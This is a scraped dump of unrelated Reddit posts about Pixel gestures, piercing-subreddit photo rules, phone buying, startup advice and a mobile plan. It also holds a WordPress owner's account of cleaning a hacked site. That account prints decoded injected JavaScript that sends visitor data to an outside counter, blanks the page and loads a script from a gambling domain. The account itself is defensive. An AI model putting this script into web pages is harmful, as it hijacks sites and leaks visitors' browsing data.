Reddit,2025-10-29T22:12:20.243350,google pixel,https://www.reddit.com/r/GooglePixel/comments/1oji7pv/longtime_ios_user_switched_to_pixel_10_pro_xl/,Long-time iOS user switched to Pixel 10 Pro XL: diagonal swipes keep turning into vertical scrolls. Anyone else? Any fixes?,"I‚Äôve been on iOS for \~15 years. I decided not to get the iPhone 17 Pro Max after feeling there wasn‚Äôt much real innovation over the last four years and jumped to a Pixel 10 Pro XL for the AI features. The phone feels legitimately powerful and I like a lot about it.

One thing is driving me nuts. When I try to swipe horizontally, a slight diagonal thumb swipe often turns into a vertical scroll. On iOS, the system seems to ‚Äúget‚Äù my intent and direction-locks to horizontal. On Android, it feels like the UI commits to vertical too easily unless my swipe is perfectly straight.

Where I see it most  
‚Ä¢ Walmart cart screen: the horizontal suggestions under the cart love to scroll the page vertically instead of sliding sideways.  
‚Ä¢ Amazon product pages: the horizontal ‚ÄúSponsored‚Äù product carousels often scroll the page vertically on small diagonals.  
‚Ä¢ Messenger apps: media carousels and horizontal chips regularly misinterpret diagonals.

What I already tried  
‚Ä¢ Fully updated system and apps  
‚Ä¢ Tuned back-gesture edge sensitivity  
‚Ä¢ Turned on touch-sensitivity / screen-protector mode(Just checked it out although I have no screen protection on)  
‚Ä¢ Temporarily used 3-button nav while testing

Questions  
‚Ä¢ Do you see the same diagonal-to-vertical behavior on recent Pixels?  
‚Ä¢ Any hidden settings, flags, or launcher/gesture tweaks that improve horizontal direction-locking?  
‚Ä¢ If you moved from iOS, did this bother you at first and then fade as you adjusted your swipe angle?

Constructive ask to Google/Android devs  
Please prioritize this. Bias the recognition toward horizontal when the initial movement suggests a sideways swipe, or give us a setting to prefer horizontal direction-lock. The Pixel 10 Pro XL is fantastic overall, but this one behavior makes you miss the ‚Äúsmooth and floating‚Äù feel that IOS has.",erfan_fcz,,GooglePixel

Reddit,2025-10-29T22:12:20.243350,google pixel,https://www.reddit.com/r/piercing/comments/1ojgh55/rpiercing_rule_photos_at_least_need_to_be_in/,"r/piercing rule, Photos at least need to be in focus, well lit, clear and close up.","Hey everyone,

Although we do our best to make the rules of this subreddit as clear as we can within the characters limits, we notice that sometimes there‚Äôs some confusion or misunderstanding about the rules.

This post is about our photo rule, and it applies to all photos you add to your post.

* All photos need to be **clear, in focus, well lit.**
* All photos need to be **close up** to showcase the piercing or relevant body part in detail. 
* Poses should be neutral and designed to **show off only the piercing**.
* No nudity beyond what is strictly necessary to show the piercing
* Credit the piercer and shop by name whenever possible, include jewelry information if you can
* Do not include social media handles, shop website addresses or (self) promotion in either photo or text

Below we will explain each bullet point in detail.

# But first, your privacy and safety

Be careful when posting photos online. Do not post screenshots that display your location or that includes miniatures of other photos from your photo album. Likewise do not share iCloud or Google drive links those often gives away your full name.    

And please, do not send photos through DM or chat.

# All photos need to be clear, in focus, well lit.

If you use more than one photo in your post then each photos should follow the guidelines. 

**Clear** means that a photo should be easily understandable.  People shouldn‚Äôt have to guess what sort of piercing they are looking at nor should the photo be so filtered that features are lost.  

**In focus** is often a problem when photos are enlarged and cropped. If a photo is in focus but you then enlarge and crop it, it often becomes too grainy/pixelated to be able to see the piercing or problem clearly. 

**Well lit**. Artificial lightning often causes a photo to be too dark and grainy/pixelated to show case the piercing well.

# All photos need to be close up to showcase the piercing or relevant body part in detail.

People visit Reddit through all sort of devices with various screen sizes. If you want advice on what facial piercings would look good on you or if you want to show off your facial set up, your face should take up **at least 2/3** of the total photo height. If you want to show your navel piercing we should not be able to tell how big or small your waist is. If you have a question about your nipple piercings, you should not be able to tell whether you have big or small breasts. The only thing that should be visible of you in the photo should be the piercing or the specific body part you have a question about. 

Of course cats can be featured in the photo, but don‚Äôt expect people to pay attention to your piercing then and don‚Äôt forget to mention the name of the cat.

***Photography tips!*** Often the front facing camera of your phone is not as good as the back camera. To photograph yourself with the back camera, simply get a mirror. With some angling you can see the screen of your phone in the mirror and can then frame, focus and take the photo with the better quality back camera. 

For well lit photos it‚Äôs best to take them during daylight, preferably outdoors. If it‚Äôs not an option to wait for daylight, get somewhere well lit, like a bathroom. Add some more lights if possible because artificial light may look bright to you, a camera needs more light. It might not do wonders for your complexion, but it's the piercing that matters. 

Look up the minimum distance your camera needs to be able to focus. If you hold the camera too close, your camera may not be able to focus. If your camera has a "" food photography"" setting, use that because it tends to work well for things like ear piercings.

# Poses should be neutral and designed to show off only the piercing.

Instagram and other fun filters shouldn‚Äôt be used in photos. Poses should be neutral, so don‚Äôt show off cleavage unless your post is about your chest dermals. Don't post photos where you flip the bird, are smoking or drinking, are trying to seduce the viewer or we can tell where you are based on your surroundings. Don‚Äôt stick out your tongue in photo if you‚Äòre not showing off your tongue piercing. If needed, simply take a new photo instead of the fun photo you send to your friend last night or the photo that would do well on a dating website.

# There should be no nudity in the picture beyond what is necessary to show the piercing.

If your photo follows the already discussed guidelines, then this shouldn‚Äôt be a problem. Your photo shouldn‚Äôt show any skin besides the part that‚Äòs pierced or you have a question about. Want to show of your PA, that‚Äôs fine as long as you tag NSFW, but we shouldn‚Äôt be able to see anything else of your body. If you want to show of more, there‚Äôs nothing wrong with that, but there are subreddits for that, this subreddit is solely about piercings. And guys, put on a shirt before you take a photo

# Credit the piercer and shop by name whenever possible, include jewelry information if you can

There are amazing piercers that do great work. Especially if you are pleased with the work they‚Äôve done for you, credit them. Amazing piercers deserve all the recognition and the publicity.

# Do not include social media handles, shop website (links) or (self) promotion in either photo or text

This one should speak for itself but we do want to specify that it doesn‚Äôt mean you can‚Äôt mention the shop name of where your piercer works.

# Additionally,

**Moderators** will remove posts when the photo(s) used in post don‚Äôt follow this subreddit rule. If we do that, you will receive a message explaining why your photo isn‚Äôt in line with the rule and an invitation to repost with a suitable photo. As moderators we do our best to assess all photos posted but if you see a photo that doesn‚Äôt follow the rule of this subreddit, or if you see any other content that doesn‚Äôt follow the rules of this subreddit, please hit the report button so we can assess it and take action if needed.

**The** **advice we** actually dislike to give, because it shouldn‚Äôt be needed. If you are posting a photo, especially of nipple or genital piercings consider (temporarily) **disabling DM‚Äôs**. Most of our community is awesome and wouldn‚Äôt even consider breaking the ‚Äúno comments about appearance or sexual comments‚Äù rule even if it wasn‚Äôt a rule. Unfortunately that doesn‚Äôt go for everyone that will see your photo. Fun fact, sexualising someone without their consent is specifically against Reddit TOS.

* [Report chat](https://reddit.zendesk.com/hc/en-us/articles/360043035472-How-do-I-report-a-chat-message-)
* [Report DM](https://reddit.zendesk.com/hc/en-us/articles/360058752951-How-do-I-report-a-private-message-)

**Additionally, if you want** to post a photo here because you would like people to comment on your overall appearance, body or face, then this is not the right subreddit. There's nothing wrong with wanting that, but this subreddit is strictly about piercings. Don't use having a piercing or maybe thinking of getting a piercing as an excuse to post here.

Worried because you are unsure if your photo follows the rule? If you want you can add ‚Äúrequest check by mod‚Äù flair to your post and we will check it for you before your post goes up.

**If you have any additional photography tips you would like to see included or if you have any questions,** please send a [message to the mods](https://www.reddit.com/message/compose?to=%2Fr%2Fpiercing)",AutoModerator,,piercing

I bought it used seven years ago and it never charged well (and now the camera is broken and the battery life is bad, and and ... but it's still good for Google Photos uploads. Anyway.) I assume the reason it's never charged well is that this little metal collar, inside the charging USB-C port, is loose. Recently when I was cleaning the lint out, I kind of hooked the collar upwards and cleaned under it, then pushed it back into place, but of course it's been bent all along. I realize I don't actually know if collar has become bent away from the *outer* wall of the female port and come towards the center, or whether it's actually separated from the *inner* wall (directly under the pins) and moved into the way. Also, I guess I don't even know if the collar is important or just serves as a guide to the plug. Is this collar what's serving as the opposite wire when charging? If I were to pull it out rather than trying to bend it back into place, would the phone still charge?

After 3 hours of digging and discussing with ChatGPT, I finally found the malware and destroyed it. Here‚Äôs how I noticed something was wrong, what clues I followed, and how you can start looking if something similar happens to you.

**It all started with a weird email from Google Search Console.**

I‚Äôve had my website registered on Google Search Console for a while, so getting an email from them wasn‚Äôt unusual.  
But this one was different it said¬†a random email address had been added as an owner¬†to my property.  
I was immediately shocked. Like...¬†*how is that even possible?!*

I logged into Search Console and quickly removed the user.

https://preview.redd.it/9krevyveu3yf1.png?width=845&amp;format=png&amp;auto=webp&amp;s=e7d6988a0c49b72fc4e3f365362b90b716ef7959

Then I started thinking:¬†*how could someone just randomly add themselves as an owner?*

That‚Äôs when I remembered how I originally verified my website by uploading a Google authentication HTML file to my hosting‚Äôs root folder. So I opened my FTP and, surprise... there were¬†**two authentication files**¬†instead of one.  
I checked which one was mine and deleted the other one.

I changed all passwords, deleted all FTP users, created new ones with strong passwords, and thought I‚Äôd fixed everything.

A few weeks later, I logged into Search Console again, just to check performance.  
Then I noticed a ‚ÄúRecommendation‚Äù saying: 'A page has recently received more impressions than usual'

I clicked it  and saw this URL:  
`/top-10-goksites/`¬†(Dutch for ‚ÄúTop 10 gambling sites‚Äù).

That‚Äôs when I knew something was seriously wrong.

I opened the¬†**Sitemaps**¬†section and saw a new entry that definitely wasn‚Äôt mine:  
`/index.php?feed=xmlsitemap2501`

Google showed¬†**14,401 indexed pages.**  
I opened the sitemap and saw endless URLs promoting gambling and shady links.  
Even worse ‚Äî when I clicked one, it actually¬†**worked**.  
It loaded a full-on gambling page ‚Äî¬†*under my domain name!*¬†Complete with colors, buttons, ‚Äúregister now‚Äù banners... everything.

I started to panic.

  
After some back-and-forth with ChatGPT (which gave me solid hints where to look), I started digging.

Check for weird files I searched through¬†`/uploads/`,¬†`/themes/`, and¬†`/plugins/`. That‚Äôs where I found the first part of the problem a file inside my child theme called¬†`functions-client.php`. The script inside allowed anyone to upload files anywhere on the server. I deleted it immediately.

Search the database ChatGPT then suggested checking the¬†`wp_options`¬†table for suspicious long entries. I ran this query:

    SELECT option_name, LENGTH(option_value) FROM wp_options WHERE autoload = 'yes' ORDER BY LENGTH(option_value) DESC LIMIT 10;

And boom I found a massive encoded entry.

  
I copied the¬†`option_value`, pasted it into a Base64 decoder (because hackers often hide malware that way), and‚Ä¶ there it was.  
**Malware.**¬†Hidden deep inside my database.  
It was creepy but also such a relief to finally find¬†*something*.

This was the malware I found:

When decoded, it turned into this:

    new Image().src = ""//counter.yadro.ru/hit;csnnl?r""+
    escape(document.referrer)+((typeof(screen)==""undefined"")?"""":
    "";s""+screen.width+""*""+screen.height+""*""+(screen.colorDepth?
    screen.colorDepth:screen.pixelDepth))+"";u""+escape(document.URL)+
    "";""+Math.random();
    document.addEventListener(""DOMContentLoaded"", function (event) {
        var bodyNode = document.getElementsByTagName('body')[0];
        if (bodyNode) {
            bodyNode.remove();
        }
    });
    var dhiCQeqsuz=""&lt;script type=\""text/javascript\"" language=\""JavaScript\"" "";var xUMhqVbRuX=""src=\""//gamblersrules.com/"";var KnWMVmkvRD=""csnnl.js?ref=""+encodeURI(document.URL)+""&amp;title=""+encodeURI(document.title)+""&amp;httpref=""+encodeURI(document.referrer)+""\""&gt;"";var FShemKQtER="" &lt;/script&gt;"";document.write(dhiCQeqsuz+xUMhqVbRuX+KnWMVmkvRD+FShemKQtER);

I deleted that database record.  
After that, when I opened one of the gambling URLs, I noticed some changes:  
the CSS and images were gone, but the¬†**text**¬†of the gambling content was still there.  
I could see my own header and footer ‚Äî meaning the hacked content was coming from somewhere else.

That ‚Äúsomewhere else‚Äù turned out to be the¬†`wp_posts`¬†table.  
Every single fake page was actually a WordPress post created by the hacker.  
And they all had the¬†author ID 2501, the same number I saw in the sitemap URL.

So a quick SQL command:

    DELETE FROM wp_posts WHERE post_author = 2501;

...and BOOM all those pages were gone.

Now when I open any of the old URLs, I just get a proper¬†**404 Not Found**.  
The spam is dead.

**VICTORY!!!**

# What‚Äôs Next

Now I just need to wait for Google to crawl all the old URLs and see that they return 404s so they get deindexed from the search results.

Honestly, it was a crazy experience, but also super satisfying to slowly take back control and destroy every piece of that malware one step at a time.

If you ever notice weird URLs or traffic spikes on your domain: check your sitemaps, your wp\_options table, and your uploads folder.  
You might just find something lurking there.",flixbus101,,Wordpress

I did not upgrade in years because I never paid attention to phones like that.

This are the following phones that I can afford at the moment.

Sony Xperia 1 V
Iphone 16 (base)
S24 (base)
Google Pixel 9 (base)

What is the most important factor or priorities the phone I'm looking for should have?

1. Top notch Display
2. Top notch sound/speakers
3. Top notch Camera
4. Powerful processor 
5. Sleek design or Ulitirian design

I personally don't care for flashy UI Or Anything like that. As long as the phone is The best on the list I listed above is all I cafe about.

My hands are humongous (6'4 tall) and iy would be a treat or helpful if i had a phone that fit well into my hands. 

The Pro max is either way out of my budget or if it is in my budget its way too wide for my liking. Hence why i chose the Sony because of the 21.9 ratio. 

If you have any other alternative in the same budget frame that also qualifies with my requirements. It would be greatly appreciated.",FunDamage6899,,Smartphones

\-Yes I AM a little crazy. lol

\-Yes I didn‚Äôt do it the way you might have done it. :-)

\-Yes this is real, I did this all transparently on Reddit in real time from when I was doing $4k a month where the image starts with build in public, all the way to past $200k a month. Check the history through the years, you‚Äôll find screenshots, me logging into my stripe with video lol, a tour of our office and warehouse, and everything in between.¬†

**Now that‚Äôs that‚Äôs out the way‚Ä¶**

Here‚Äôs what I want to say.¬†

So I got here by doing things my way and not caring what the generally accepted startup methods were.

I simply sold what people already buy.¬†**GENIUS!**

But if I were to start over again here‚Äôs what I would say to a younger me:

**DON‚ÄôT DO ANY OF THIS.**

**DON‚ÄôT**¬†Try to solve multiple things as opportunities pop up that could be complementary products to your main product.

**DON‚ÄôT**¬†Launch without full validation testing while getting started.

**DON‚ÄôT**¬†Skip the planning stages where you do full market research, economic research, SWOT analysis, where you take as much time as possible planning carefully and validating each product before you build.¬†

**DON‚ÄôT**¬†Put up a landing page and slap on a stripe checkout and try to get your first customer

**DON‚ÄôT**¬†Launch before everything is perfect and every pixel in place.

**DON‚ÄôT**¬†See startups as a numbers game where you put up as many shots as possible to see what works like you‚Äôre a venture capitalist distributing risk.

**DON‚ÄôT**¬†Throw in the towel if something isn‚Äôt rolling within 60 days of launch and diligent marketing.

**Don‚Äôt**¬†Launch before testing demand as if you can infer demand from the fact that there are viable competitors making money.¬†

**Don‚Äôt**¬†Focus on a slimmed down product and FAT marketing like‚Ä¶this is the path to success!¬†

Let me stop messing with y‚Äôall. Re-read those last few sentences and ignore ‚ÄúDon‚Äôt‚Äù.¬†

**These things are EXACTLY what I would do all over again.**

I‚Äôm not a genius.¬†

I‚Äôm not even great at business.¬†

Everything I learned I learned by doing and googling. And taking shots and learning along the way. (And this is enough to separate the winners from folks on the sidelines)

**Do this instead if you haven't launched anything (serious this time):**

1. Grab a one page business plan and write that idea out.
2. Make sure it‚Äôs something with viable competition. Boom: Validation done.
3. Get up a landing page (Takes like 10 minutes these days)
4. Set up your stripe or calendly (schedule a call) link
5. And get to marketing hitting all of these as close to daily as possible

* Facebook Groups
* Facebook Dms
* Facebook profiles
* Linkedin
* Reddit
* Twitter (Will forever be Twitter Fuck x)
* Tik Tok
* Instagram
* Youtube Shorts

Building a new tool for this btw:¬†[https://x.com/rohangilkes/status/1982582055910375794](https://x.com/rohangilkes/status/1982582055910375794)

If you don‚Äôt have some money from this in like 60 days, Fam, pivot and move on.¬†

You‚Äôll learn a shit ton more from going through this a couple times that hanging out on the sidelines for the next decade.

**SO WHAT WAS I THINKING IN DOING ALL THIS?**

Fam, I was broke, hated my job, and wanted a way out of corporate America. The end.¬†

No magical dreams about changing the world. Wasnt‚Äô trying to get clean water to Flint!

My dreams were about my next car payment and finding the right a/c setting so it would kick on the exact perfect number of times where I could keep my electricity bill low enough while also not dying of heat stroke.

And none of this is perfect. But life isn‚Äôt perfect. Imagine if folks overthought relationships like they overthought building businesses. Some of y‚Äôall would die alone lol

**So that‚Äôs what I wanted to get out**

* No you don‚Äôt need to get the tech perfected.
* Nope that business plan doesn‚Äôt have to be 60 pages. What is this 1997?
* Nope you don‚Äôt need funding (go build something that matches your bank account)¬†

Here‚Äôs what I‚Äôve realized. Most aspiring entrepreneurs are¬†**physically allergic to execution.**

\-You‚Äôve read every startup book.  
\-You‚Äôre in ten ‚Äúfounder‚Äù Discords.  
\-You‚Äôve watched a thousand YouTube videos about passive income and scalability.  
\-You‚Äôve even got a Notion doc labeled ‚Äú2025 Business Ideas.‚Äù

But you still haven‚Äôt launched a single thing.

Why?

Because you‚Äôve confused¬†*preparation*¬†with¬†*progress*.  
**You think startups are about perfect ideas ‚Äî Startups are about**¬†***reps***\*\*.\*\*¬†

**Well that's just opinion any way, that doesn't make me right.**

But my opinion is if you keep waiting for that perfect idea you‚Äôre going to keep getting trumped by people that put up reps.¬† And now with AI the ability to put up reps is closer to once per week than it is once per year (like when i was starting out).

**SO FINAL THOUGHTS**

Take action.¬†

Overthinking and overplanning ttricks your brain into thinking you‚Äôre building something when you‚Äôre stuck in preparation mode.

Instead, treat business content like a recipe ‚Äî not a novel.

If you want to cook a steak, you don‚Äôt spend five days reading Gordon Ramsay‚Äôs autobiography. You type ‚Äúhow to cook a perfect steak‚Äù into YouTube, hit play, and start searing.

Medium rare of course.

**Questions**

I know my way isn‚Äôt the only way. I‚Äôm curious, for those of you who have been building for a while:

If you had to start over, would you put up multiple shots or grind it out with one project?

Would love to hear stories, lessons etc.

All this is just one person's opinion at the end of the day.

Just a few quick things.

My credit is decent (700s) but haven't worked since last year ( destroyed knee and ankle) should be fine to work in spring. I'm bringing my own phone. (Pixel 8) Based on that:

1- Would I be fine with a post paid plan? Im not too fussed about the latest and greatest. Tend to upgrade every 3-4 generations if that. If not, what are my alternatives?

2- Outside of my parents and the occasional call, I rarely use my phone to talk. Most of my friends use Discord. Would a 60 GB plan be fine? I'd rather not do pay as you go in case shit hits the fan.

3- I live in the GTA. How is reception in general? I use Google maps once in a while and I'm old school so I have my music downloaded to my phone.

4- I might slap on Graphene OS. Would that cause any issues with Freedom?

Sorry for the crap grammar. Heavily medicated at the moment, but counting down the days till I can leave Rogers and join Freedom (and hopefully Teksavvy or Bell for net)

Have a great day
